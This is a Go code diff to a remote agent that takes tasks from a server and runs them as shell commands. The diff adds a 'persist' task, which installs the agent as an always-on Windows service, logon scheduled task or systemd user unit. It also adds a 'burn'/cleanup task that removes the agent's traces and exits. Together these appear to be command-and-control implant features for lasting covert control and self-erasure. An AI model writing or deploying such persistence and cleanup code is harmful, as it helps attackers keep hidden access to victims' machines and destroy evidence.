@@ -8,6 +8,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/digitizables/lattice/agent/install"
 	agentv1 "github.com/digitizables/lattice/gen/lattice/agent/v1"
 )
 
@@ -158,7 +159,44 @@ func (a *Agent) runTask(ctx context.Context, t *agentv1.Task) (exitCode int32, s
 		return a.runShell(ctx, taskID, "powershell", commandLine("", args))
 	case "bash", "sh":
 		return a.runShell(ctx, taskID, name, commandLine("", args))
+	case "persist", "install-service":
+		return a.runPersist()
+	case "cleanup", "uninstall-all", "burn":
+		return a.runCleanup()
 	default:
 		return a.runShell(ctx, taskID, "default", commandLine(t.GetName(), args))
 	}
+}
+
+func (a *Agent) runPersist() (int32, string, string) {
+	if a.ServerURL == "" {
+		return 1, "", "server URL unknown; restart agent with -server"
+	}
+	sleep := a.Sleep
+	if sleep <= 0 {
+		sleep = 5 * time.Second
+	}
+	err := install.Install(install.Options{
+		Server:   a.ServerURL,
+		IDFile:   a.IDFile,
+		Insecure: a.InsecureTLS,
+		Sleep:    sleep.String(),
+	})
+	if err != nil {
+		return 1, "", err.Error() + "\n(note: installing a service usually requires elevated privileges)"
+	}
+	msg := "installed always-on persistence as " + install.ServiceName() +
+		"\nbinary " + install.BinaryPath() +
+		"\n(Windows service if elevated; otherwise a per-user logon scheduled task / systemd user unit)"
+	return 0, msg, ""
+}
+
+func (a *Agent) runCleanup() (int32, string, string) {
+	res, err := install.Cleanup()
+	out := strings.Join(res.Steps, "\n")
+	a.exitAfterTask = true
+	if err != nil {
+		return 1, out, err.Error()
+	}
+	return 0, out + "\ncleanup complete — agent will exit", ""
 }
